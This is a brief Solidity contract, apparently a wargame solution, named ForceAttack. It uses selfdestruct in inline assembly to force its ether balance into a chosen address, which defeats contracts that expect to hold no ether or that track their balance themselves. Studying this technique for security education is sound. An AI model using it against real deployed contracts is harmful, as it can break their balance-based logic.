// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;


contract ForceAttack{
    constructor() payable{

    }
    function attack(address to) external{
        assembly{
            selfdestruct(to)
        }
    }
//    receive() external payable{
//
//    }
}
